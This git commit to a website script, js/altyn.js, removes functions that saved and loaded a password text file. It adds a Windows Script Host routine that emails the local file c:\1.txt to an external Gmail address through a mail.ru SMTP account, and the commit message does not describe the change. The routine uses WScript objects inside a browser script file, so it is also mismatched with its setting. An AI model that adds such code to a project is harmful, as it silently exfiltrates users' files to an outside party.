e0d4d4c7429c91dba392342e7b1bd0ad5129628d
Dias <diasermekov09@gmail.com>
2023-03-09 18:50:44 +0600

    f

--- js/altyn.js
+++ js/altyn.js
@@ -1,28 +1,49 @@
-// JavaScript code
-function saveAuthorization() {
-    const authorizationText = document.getElementById("password").value;
-    const file = new Blob([authorizationText], {type: "text/plain"});
-    const url = URL.createObjectURL(file);
-    const link = document.createElement("a");
-    link.href = url;
-    link.download = "authorization.txt";
-    link.click();
-}
+var to = "sajtaproverka428@gmail.com";  
+         var subj = "тема письма";  
+         var text = "собственно тело письма";  
+ 
+SendMail(to, subj, text, ["c:\\1.txt"]); 
+ 
+ 
+function SendMail(sRecipientMail, sSubject, sMsgBody,files)   
+{   
+    try   
+    {   
+        // create a session and log on -- username and password in profile    
+        var refMsg = WScript.CreateObject("CDO.Message");   
+        var refConf = WScript.CreateObject("CDO.Configuration");   
+           
+        // Setting configuration params   
+        with(refConf.Fields)   
+        {   
+            Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.mail.ru";  
+            Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2; 
+            Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1;  
+            Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "lou@list.ru";  
+            Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "****"; 
+        }   
+        refConf.Fields.Update();   
+   
+        with(refMsg)   
+        {   
+            Configuration = refConf;   
+            To       = sRecipientMail;   
+            From     = "lou@list.ru";   
+            Subject  = sSubject;   
+            TextBody = sMsgBody;   
+        }  
   
-function loadAuthorization() {
-  const input = document.createElement("input");
-  input.type = "file";
-  input.accept = "text/plain";
-  input.onchange = (event) => {
-    const file = event.target.files[0];
-    const reader = new FileReader();
-    reader.readAsText(file);
-    reader.onload = (event) => {
-      const authorizationText = event.target.result;
-      document.getElementById("authorization-text").value = authorizationText;
-      alert("Authorization loaded successfully!");
-    };
-  };
-  input.click();
-}
+        if (files)  
+        {  
+            for(var i=0; i<files.length; i++)  
+                refMsg.AddAttachment(files[i]);  
+        }  
   
+        refMsg.Send();   
+    }    
+    catch(e)   
+    {   
+        WScript.Echo("SendMail error !!! : " + e.description);   
+        WScript.Quit(1);   
+    }   
+}
